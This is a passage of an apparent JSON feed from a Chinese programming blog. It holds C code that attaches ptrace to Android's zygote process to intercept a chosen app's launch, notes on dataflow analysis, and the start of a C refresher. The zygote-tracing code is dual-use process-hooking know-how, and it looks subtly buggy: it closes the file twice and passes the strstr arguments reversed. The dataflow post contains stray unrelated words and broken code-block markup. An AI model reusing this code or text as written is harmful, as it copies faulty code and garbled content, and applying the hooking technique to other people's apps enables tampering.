class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;dirent.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;fcntl.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;getopt.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> BUF_SIZE 1024</span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">getNameByPid</span><span class=\"hljs-params\">(<span class=\"hljs-type\">pid_t</span> pid, <span class=\"hljs-type\">char</span> *task_name)</span> {<br>    <span class=\"hljs-type\">char</span> proc_pid_path[BUF_SIZE];<br>    <span class=\"hljs-type\">char</span> buf[BUF_SIZE];<br><br>    <span class=\"hljs-built_in\">sprintf</span>(proc_pid_path, <span class=\"hljs-string\">\"/proc/%d/status\"</span>, pid);<br>    FILE* fp = fopen(proc_pid_path, <span class=\"hljs-string\">\"r\"</span>);<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-literal\">NULL</span> != fp){<br>        <span class=\"hljs-keyword\">if</span>( fgets(buf, BUF_SIZE<span class=\"hljs-number\">-1</span>, fp)== <span class=\"hljs-literal\">NULL</span> ){<br>            fclose(fp);<br>        }<br>        fclose(fp);<br>        <span class=\"hljs-built_in\">sscanf</span>(buf, <span class=\"hljs-string\">\"%*s %s\"</span>, task_name);<br>    }<br>}<br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span>{<br>\t<span class=\"hljs-type\">int</span>         status;<br>\t<span class=\"hljs-type\">int</span>         success = <span class=\"hljs-number\">0</span>;<br>\t<span class=\"hljs-type\">pid_t</span>       wait_pid; <br>\t<span class=\"hljs-type\">pid_t</span>       target_pid = <span class=\"hljs-number\">-1</span>;<br>\t<span class=\"hljs-type\">long</span> zygote_pid = <span class=\"hljs-number\">1398</span>; <span class=\"hljs-comment\">// zygote进程的pid</span><br>\t<span class=\"hljs-type\">char</span>  appname[<span class=\"hljs-number\">128</span>] = <span class=\"hljs-string\">\"com.example.x86demo\"</span>; <span class=\"hljs-comment\">// app的包名称</span><br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Ptrace Zygote\\n\"</span>);<br>\t<span class=\"hljs-type\">int</span> res = ptrace(PTRACE_ATTACH,zygote_pid,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>);<br>\t<span class=\"hljs-keyword\">if</span>(res == <span class=\"hljs-number\">-1</span>){<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"res: %d\\n\"</span>,res);<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"hook zygote error\\n\"</span>);<br>\t}<br>\twaitpid(zygote_pid, <span class=\"hljs-literal\">NULL</span>, <span class=\"hljs-number\">0</span>);<br>\t<span class=\"hljs-comment\">// 拦截zygote的fork操作</span><br>\tres = ptrace(PTRACE_SETOPTIONS, zygote_pid, (<span class=\"hljs-type\">void</span> *)<span class=\"hljs-number\">0</span>, (<span class=\"hljs-type\">void</span> *)(PTRACE_O_TRACEFORK));<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"ptrace zygote PTRACE_O_TRACEFORK res: %d\\n\"</span>,res);<br>\t<span class=\"hljs-keyword\">if</span> (res == <span class=\"hljs-number\">-1</span>) {<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"FATAL ERROR: ptrace(PTRACE_SETOPTIONS, ...)\\n\"</span>);<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>        }<br>\t<span class=\"hljs-comment\">// 恢复zygote的运行</span><br>\tptrace(PTRACE_CONT, zygote_pid, (<span class=\"hljs-type\">void</span> *)<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"zygote continue \\n\"</span>);<br>\t<span class=\"hljs-keyword\">for</span> (;;) {<br>            <span class=\"hljs-comment\">// fork后子进程的pid</span><br>            wait_pid = waitpid(<span class=\"hljs-number\">-1</span>, &amp;status, __WALL | WUNTRACED);<br>            <span class=\"hljs-keyword\">if</span>(status&gt;&gt;<span class=\"hljs-number\">8</span> == (SIGTRAP | (PTRACE_EVENT_FORK&lt;&lt;<span class=\"hljs-number\">8</span>))){<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"fork出子进程 status&gt;&gt;8 == (SIGTRAP | (PTRACE_EVENT_FORK&lt;&lt;8)) %d\\n\"</span>,wait_pid);<br>            }<br>            <span class=\"hljs-keyword\">if</span> (wait_pid==zygote_pid){ <span class=\"hljs-comment\">//如果发出信号进程的进程号跟pid一致，则说明它是被跟踪程序的父进程，否则是被跟踪程序的子进程</span><br>                <span class=\"hljs-keyword\">if</span>(WIFSTOPPED(status)){<br>                    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"zygote continue \\n\"</span>);<br>                    ptrace(PTRACE_CONT,wait_pid,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>);<br>                    <span class=\"hljs-keyword\">continue</span>;<br>                }<br>            }<br>            <span class=\"hljs-comment\">// 判断fork后的程序是不是我们指定的应用</span><br>            <span class=\"hljs-keyword\">if</span> (wait_pid != <span class=\"hljs-number\">0</span> &amp;&amp; wait_pid!=zygote_pid){<br>                <span class=\"hljs-type\">char</span> name[<span class=\"hljs-number\">256</span>]={<span class=\"hljs-number\">0</span>};<br>                getNameByPid(wait_pid,name);<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"wait_pid: %d,name: %s\\n\"</span>,wait_pid,name);<br>                <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">strstr</span>(appname, name) != <span class=\"hljs-number\">0</span>) {<br>                    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"匹配到appname: %s\\n\"</span>,appname);<br>                    <span class=\"hljs-comment\">// detach from zygote</span><br>                    ptrace(PTRACE_DETACH, zygote_pid, <span class=\"hljs-number\">0</span>, (<span class=\"hljs-type\">void</span> *)SIGCONT);<br>                    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Detach from zygote\\n\"</span>);<br>                    <span class=\"hljs-comment\">// now perform on new process</span><br>                    target_pid = wait_pid;<br>                    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"appname: %s pid: %d\\n\"</span>,appname,target_pid);<br>                    success = <span class=\"hljs-number\">1</span>;<br>                    <span class=\"hljs-comment\">// 拦截目标进程的clone和exit,clone重要 exit调试用</span><br>                    res = ptrace(PTRACE_SETOPTIONS, target_pid, (<span class=\"hljs-type\">void</span> *)<span class=\"hljs-number\">0</span>, (<span class=\"hljs-type\">void</span> *)(PTRACE_O_TRACECLONE|PTRACE_O_TRACEEXIT|PTRACE_O_TRACEVFORK));<br>                    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"ptrace PTRACE_O_TRACECLONE|PTRACE_O_TRACEEXIT res: %d\\n\"</span>,res);<br>                    <span class=\"hljs-keyword\">if</span> (res == <span class=\"hljs-number\">-1</span>) {<br>                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"FATAL ERROR: ptrace(PTRACE_SETOPTIONS, ...)\\n\"</span>);<br>                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>                    }<br>                    <span class=\"hljs-keyword\">break</span>;<br>                } <span class=\"hljs-keyword\">else</span> {<br>                    <span class=\"hljs-comment\">// 不是的话就continue</span><br>                    ptrace(PTRACE_SYSCALL, wait_pid, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>);<br>                    <span class=\"hljs-keyword\">continue</span>;<br>                }<br>            }<br>        }<br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.xjx100.cn/news/510354.html?action=onClick\">https://www.xjx100.cn/news/510354.html?action=onClick</a></p>\n",
            "tags": [
                "binary"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/30/shu-ju-liu-fen-xi-ji-zhu-dfa/",
            "url": "https://alazymechnaic.github.io/2023/09/30/shu-ju-liu-fen-xi-ji-zhu-dfa/",
            "title": "数据流分析",
            "date_published": "2023-09-30T06:48:10.000Z",
            "content_html": "<h1 id=\"DataFlow-Analysis\"><a href=\"#DataFlow-Analysis\" class=\"headerlink\" title=\"DataFlow Analysis\"></a>DataFlow Analysis</h1><hr>\n<h2 id=\"数据流分析的作用\"><a href=\"#数据流分析的作用\" class=\"headerlink\" title=\"数据流分析的作用\"></a>数据流分析的作用</h2><ul>\n<li><p><strong>简化执行代码</strong>:</p>\n<ul>\n<li>```c<br>// 在下面代码<br>x = a + b;<br>x = 5 * 2;<br>// 可以直接简化为<br>x = 10;<figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><br>- **变量取值分析**<br><br>  - ```<span class=\"hljs-keyword\">c</span><br>    a <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span><span class=\"hljs-comment\">;</span><br>    b <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">2</span><span class=\"hljs-comment\">;</span><br>    <span class=\"hljs-keyword\">c</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">3</span><span class=\"hljs-comment\">;</span><br>    if (...) <span class=\"hljs-keyword\">x</span> <span class=\"hljs-operator\">=</span> a + <span class=\"hljs-number\">5</span><span class=\"hljs-comment\">;</span><br>    else <span class=\"hljs-keyword\">x</span> <span class=\"hljs-operator\">=</span> b + <span class=\"hljs-number\">4</span><span class=\"hljs-comment\">;</span><br>    <span class=\"hljs-keyword\">c</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">x</span> + <span class=\"hljs-number\">1</span><span class=\"hljs-comment\">;</span><br>    // 虽然程序复杂但是可以直接简化为<span class=\"hljs-keyword\">c</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">7</span><br>    <span class=\"hljs-keyword\">c</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">7</span><span class=\"hljs-comment\">;</span><br></code></pre></td></tr></tbody></table></figure></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"技术划分\"><a href=\"#技术划分\" class=\"headerlink\" title=\"技术划分\"></a>技术划分</h2><p>示例代码如下：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-number\">1.</span>   k = <span class=\"hljs-number\">2</span>;<br><span class=\"hljs-number\">2.</span>   <span class=\"hljs-keyword\">if</span> (...) {<br><span class=\"hljs-number\">3.</span>     a = k + <span class=\"hljs-number\">2</span>;<br><span class=\"hljs-number\">4.</span>     x = <span class=\"hljs-number\">5</span>;<br><span class=\"hljs-number\">5.</span>   } <span class=\"hljs-keyword\">else</span> {<br><span class=\"hljs-number\">6.</span>     a = k * <span class=\"hljs-number\">2</span>;<br><span class=\"hljs-number\">7.</span>     x = <span class=\"hljs-number\">8</span>;<br><span class=\"hljs-number\">8.</span>   }<br><span class=\"hljs-number\">9.</span>   k = a;<br><span class=\"hljs-number\">10.</span>  <span class=\"hljs-keyword\">while</span> (...) {<br><span class=\"hljs-number\">11.</span>     b = <span class=\"hljs-number\">2</span>;<br><span class=\"hljs-number\">12.</span>     x = a + k;<br><span class=\"hljs-number\">13.</span>     y = a * b;<br><span class=\"hljs-number\">14.</span>     k++;<br><span class=\"hljs-number\">15.</span>  }<br><span class=\"hljs-number\">16.</span>  print(a+x);<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"Constant-Propagation\"><a href=\"#Constant-Propagation\" class=\"headerlink\" title=\"Constant Propagation\"></a><em>Constant Propagation</em></h3><p>​\tconstant propagation本质是分析程序中某些变量的值的集合，表现为（变量，取值）的键值对</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309301506330.png\" alt=\"image-20230930150627177\"></p>\n<h3 id=\"Live-Variable-Analysis\"><a href=\"#Live-Variable-Analysis\" class=\"headerlink\" title=\"Live-Variable Analysis\"></a><em>Live-Variable Analysis</em></h3><p>​\t该分析的目的是找到当前时刻中的哪些变量，在内容被覆盖之前可能会被使用，这类变量称为live-Variable。该分析方式属于backward may的分析方法，需要依赖后续代码来生成前面的变量使用情况。</p>\n<h2 id=\"Define-DataFlow-Problem\"><a href=\"#Define-DataFlow-Problem\" class=\"headerlink\" title=\"Define DataFlow Problem\"></a>Define DataFlow Problem</h2><p>​\t在定义数据流问题之前需要先定义两个问题，第一个是<strong>前向传播</strong>（例如，constant propagation）问题，第二个是<strong>后向传播</strong>（例如，live-Variable分析）问题。常见的数据流分析中包含的往往是may和must问题，例如live分析的时候，只能说某个变量在某个节点的存活状态时may，但是在前向传播时某个变量的取值是must。</p>\n<h3 id=\"DataFlow-Problem\"><a href=\"#DataFlow-Problem\" class=\"headerlink\" title=\"DataFlow Problem\"></a>DataFlow Problem</h3><ul>\n<li>在程序开始执行时有哪些信息</li>\n<li>当一个结点存在多于一个的入度边时，如何将两个入度的信息进行合并？</li>\n<li>当每一个结点执行结束后，如何影响当前的数据流状态？</li>\n</ul>\n<p>在数据流分析中的相关定义如下：</p>\n<ul>\n<li>CFG</li>\n<li>a domain D of “dataflow facts” ： 这里给出的定义中，DataFlow facts是指在constant propagation中出现的变量与其对应值的键值对集合，这里的domain就是该集合的幂集，相应的live-variable分析中的就是变量集合的幂集</li>\n<li>a dataflow fact “init” ： 定义前向分析的起始位置或者后向分析的结束状态。这里两种分析的init状态都是空,因为在反向扫描时，从程序结束位置开始，此时的所有变量都寄了。</li>\n<li>an operator ⌈⌉ (used to combine incoming information from multiple predecessors)，该运算符在前向传播时用作交操作，在进行后向传播时用于并操作。只有当变量x在p1和p2之后都具有值v时，才能确定在节点n之前，变量x的值也是v。在”may”类型的数据流问题中，组合操作符⌈⌉通常是类似于并集的操作符，而在”must”类型的问题中，它通常是类似于交集的操作符。</li>\n</ul>\n<p>$$<br>fn(S) = (S - KILLn) ∪ GENn<br>$$</p>\n<p>​\t其中KILLn是在节点n处定义的变量集合，GENn是在节点n处使用的变量集合。对于不对任何变量进行赋值的节点，节点n之前的活跃变量是节点n之后的活跃变量加上在节点n处被使用的变量。对于对变量x进行赋值的节点，节点n之前的活跃变量是节点n之后的活跃变量中排除变量x后的部分，再加上在节点n处使用的变量（包括变量x，如果它在节点n处既被定义又被使用）。<strong>注意这里是一个反向分析的过程，n处声明的变量定义为kill是因为再向前扫描的话，变量肯定是不存在的。如果在结点n中被用到了，则表明在n之前肯定是活的。</strong></p>\n<h2 id=\"Solving-Dataflow-Problem\"><a href=\"#Solving-Dataflow-Problem\" class=\"headerlink\" title=\"Solving Dataflow Problem\"></a>Solving Dataflow Problem</h2><p>​\t本文中提到的分析方法是针对某个基本块结点n的分析方法。但是为了保证每个节点</p>\n<h3 id=\"The-“Meet-Over-All-Paths”-Solution\"><a href=\"#The-“Meet-Over-All-Paths”-Solution\" class=\"headerlink\" title=\"The “Meet Over All Paths” Solution\"></a>The “Meet Over All Paths” Solution</h3><p>​\tMOP的思想是尽可能多地结算到达节点n时的数据流情况，也就是要考虑到所有的路径，并取∩运算。然而这个结果也是“尽可能对”的结果。MOP方案考虑了所有到达结点n的路径上的数据流状况，但即使是这种分析方式也有可能是过于保守的，因为有些路径未必是实际可执行的，例如永真/永假式的存在，或者谓词之间不独立（一个表达式的正确与否与另一个表达式相关）。</p>\n<h3 id=\"MOP的问题\"><a href=\"#MOP的问题\" class=\"headerlink\" title=\"MOP的问题\"></a>MOP的问题</h3><p>​\tMOP方式的本质是枚举尽可能多的路径来计算其上的数据流，然而对于一些循环（路径爆炸相关）的问题中，MOP方式是结束不了的。</p>\n<p>​\t<em>As we shall see, if those functions are <em>distributive</em>, then the solution that we compute is identical to the MOP solution. If the functions are <em>monotonic</em>, then the solution may not be identical to the MOP solution, but is a conservative approximation.</em></p>\n<p>​\t这里贴一下原文吧，文中说如果这些函数满足分配律（distributive）的性质，那么我们计算得到的解将与MOP解相同。如果数据流函数是单调的（monotonic），那么计算得到的解可能与MOP解不完全相同，但是它是一种保守的近似。</p>\n<p>​\t文中给出的解决方法如下：</p>\n<p>n.before：n执行之前的信息，<br>n.after：n执行之后的信息。</p>\n<p>这些n.before和n.after是我们方程的变量，其定义如下（对于每个节点n有两个方程）：<br>        <strong>n.before = ∩(p1.after, p2.after, …)</strong><br>其中p1、p2等是n在CFG中的前驱节点（∩是此数据流问题的组合运算符）。<br>        <strong>n.after = fn(n.before)</strong></p>\n<p>也就是在结点n之前的状态信息是路径p1到pn的数据流的交集。结点n之后的状态由n之前的状态计算得出。通过解这些方程，我们可以计算出每个节点的数据流信息，从而得到整个程序的数据流分析结果。</p>\n<p>​\t<em>In general, for a “must” problem the desired solution will be the largest one, while for a “may” problem the desired solution will be the smallest one.</em></p>\n<p>​\t文中给出的例子如下：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022012864.png\" alt=\"image-20231002201252770\"></p>\n<p>​\t连续传播的过程中使用的内容如下：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">// constant propagation</span><br>enter.after = empty <span class=\"hljs-built_in\">set</span> <span class=\"hljs-comment\">// 刚开始是没有任何数据赋值状态的</span><br><span class=\"hljs-number\">1.b</span>efore = enter.after <span class=\"hljs-comment\">// 所有的before都是前一个的after</span><br><span class=\"hljs-number\">1.</span>after = <span class=\"hljs-number\">1.b</span>efore - (x, *) <span class=\"hljs-keyword\">union</span> (x, <span class=\"hljs-number\">2</span>) <span class=\"hljs-comment\">// 这里在经历x=2的赋值之后，x不在是任意值，而是2</span><br><span class=\"hljs-number\">2.b</span>efore = <span class=\"hljs-number\">1.</span>after<br><span class=\"hljs-number\">2.</span>after = <span class=\"hljs-keyword\">if</span> (x, c) is in <span class=\"hljs-number\">2.b</span>efore then <span class=\"hljs-number\">2.b</span>efore - (y, *) <span class=\"hljs-keyword\">union</span> (y, c), <span class=\"hljs-keyword\">else</span> <span class=\"hljs-number\">2.b</span>efore - (y, *) <br><span class=\"hljs-comment\">// 算法思想在↑体现，只考虑相邻基本块之间的关系，因此只能分类讨论</span><br><span class=\"hljs-number\">3.b</span>efore = ⌈⌉(<span class=\"hljs-number\">2.</span>after, <span class=\"hljs-number\">4.</span>after ) <span class=\"hljs-comment\">// 存在两个前驱结点，所以取∩操作</span><br><span class=\"hljs-number\">3.</span>after = <span class=\"hljs-number\">3.b</span>efore<br><span class=\"hljs-number\">4.b</span>efore = <span class=\"hljs-number\">3.</span>after<br><span class=\"hljs-number\">4.</span>after = <span class=\"hljs-number\">4.b</span>efore<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022014784.png\" alt=\"image-20231002201421727\"></p>\n<p>这里的分析时must分析，因此要使用到solution 4，尽可能多的结果。</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">//  live-variable analysis</span><br><span class=\"hljs-comment\">// 这个从最后一行开始看比较好</span><br>enter.after = <span class=\"hljs-number\">1.b</span>efore <br><span class=\"hljs-number\">1.b</span>efore = <span class=\"hljs-number\">1.</span>after - {x} <span class=\"hljs-comment\">// x的声明位置因此要union上x</span><br><span class=\"hljs-number\">1.</span>after = <span class=\"hljs-number\">2.b</span>efore<br><span class=\"hljs-number\">2.b</span>efore = <span class=\"hljs-number\">2.</span>after - {y} <span class=\"hljs-keyword\">union</span> {x} <span class=\"hljs-comment\">// y的声明位置，所以要减去y，同时是x的使用位置要union上x</span><br><span class=\"hljs-number\">2.</span>after = <span class=\"hljs-number\">3.b</span>efore<br><span class=\"hljs-number\">3.b</span>efore = <span class=\"hljs-number\">3.</span>after<br><span class=\"hljs-number\">3.</span>after = <span class=\"hljs-built_in\">exit</span>.before ⌈⌉ <span class=\"hljs-number\">4.b</span>efore<br><span class=\"hljs-number\">4.b</span>efore = <span class=\"hljs-number\">4.</span>after <span class=\"hljs-keyword\">union</span> {y} <span class=\"hljs-comment\">// 4之后不知道，但是由于4出现了y的使用，因此要将y并入</span><br><span class=\"hljs-number\">4.</span>after = <span class=\"hljs-number\">3.b</span>efore <br><span class=\"hljs-built_in\">exit</span>.before = empty-<span class=\"hljs-built_in\">set</span>  <span class=\"hljs-comment\">// 最终结束后都是empty set</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022014760.png\" alt=\"image-20231002201431716\"></p>\n<p>这里的variable live是may模式，因此要采用的最好是least的结果。</p>\n<h3 id=\"数据流分析的格点模型\"><a href=\"#数据流分析的格点模型\" class=\"headerlink\" title=\"数据流分析的格点模型\"></a>数据流分析的格点模型</h3><p>MOP模型存在以下问题：</p>\n<ul>\n<li>我们怎么知道方程的解存在?</li>\n<li>如果有不止一个解，我们想要哪一个?</li>\n<li>方程解与MOP解有什么关系?</li>\n</ul>\n<h4 id=\"Partially-ordered-sets-偏序集\"><a href=\"#Partially-ordered-sets-偏序集\" class=\"headerlink\" title=\"Partially ordered sets 偏序集\"></a>Partially ordered sets 偏序集</h4><p>​\t设R是集合A上的一个关系，如果R是自反的、反对称的和可传递的，则称R是集合A的偏序关系，简称偏序，记作“≤”。对于（a，b）∈R，就把它表示成a≤b。</p>\n<p>​\t若在集合A上给定一个偏序关系≤，则称集合A按偏序关系≤构成一个偏序集合，集合A和偏序R一起称为偏序集，记作（A，≤）（取自百度百科）</p>\n<p>偏序关系存在以下性质：</p>\n<p>（1）自反性：a≤a，∀a∈P；</p>\n<p>（2）反对称性：∀a，b∈P，若a≤b且b≤a，则a=b；</p>\n<p>（3）传递性：∀a，b，c∈P，若a≤b且b≤c，则a≤c；</p>\n<p>campus</p>\n<p>technology</p>\n<p>located</p>\n<p>league</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p><a href=\"https://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html\">https://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html</a></p>\n",
            "tags": [
                "dataflow"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/11/c-yu-yan-fu-jian/",
            "url": "https://alazymechnaic.github.io/2023/09/11/c-yu-yan-fu-jian/",
            "title": "C语言复健",
            "date_published": "2023-09-11T11:24:57.000Z",
            "content_html": "<h2 id=\"SpeedRunner-for-C\"><a href=\"#SpeedRunner-for-C\" class=\"headerlink\" title=\"SpeedRunner_for_C\"></a>SpeedRunner_for_C</h2><hr>\n<p>​\t本文用于帮助常年不使用C语言的程序员进行复健。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309111927899.png\" alt=\"image-20230911192658774\"></p>\n<p>图片来源：<a href=\"https://mp.weixin.qq.com/s/aSiVNXJ0rKBWLy_MlzOMWA\">https://mp.weixin.qq.com/s/aSiVNXJ0rKBWLy_MlzOMWA</a></p>\n<p>直接上例子，哪里不会读哪里</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-comment\">// 定义结构体</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Person</span> {</span><br>    <span class=\"hljs-type\">char</span> name[<span class=\"hljs-number\">20</span>];<br>    <span class=\"hljs-type\">int</span> age;<br>};<br><br><span class=\"hljs-comment\">// 函数声明</span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">printPerson</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> Person* p)</span>;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-comment\">// 声明并初始化数组</span><br>    <span class=\"hljs-type\">int</span> numbers[] = {<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>};<br><br>    <span class=\"hljs-comment\">// 数组遍历</span><br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">sizeof</span>(numbers) / <span class=\"hljs-keyword\">sizeof</span>(numbers[<span class=\"hljs-number\">0</span>]); i++) {<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%d \"</span>, numbers[i]);<br>    }<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"\\n\"</span>);<br><br>    <span class=\"hljs-comment\">// 声明并初始化指针</span><br>    <span class=\"hljs-type\">int</span>* ptr = numbers;<br><br>    <span class=\"hljs-comment\">// 使用指针访问数组元素</span><br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">sizeof</span>(numbers) / <span class=\"hljs-keyword\">sizeof</span>(numbers[<span class=\"hljs-number\">0</span>]); i++) {<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%d \"</span>, *(ptr + i));<br>    }<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"\\n\"</span>);<br><br>    <span class=\"hljs-comment\">// 定义结构体变量</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Person</span> <span class=\"hljs-title\">person1</span>;</span><br>    <span class=\"hljs-built_in\">strcpy</span>(person1.name, <span class=\"hljs-string\">\"John\"</span>);<br>    person1.age = <span class=\"hljs-number\">25</span>;<br><br>    <span class=\"hljs-comment\">// 调用函数打印结构体内容</span><br>    printPerson(&amp;person1);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br><br><span 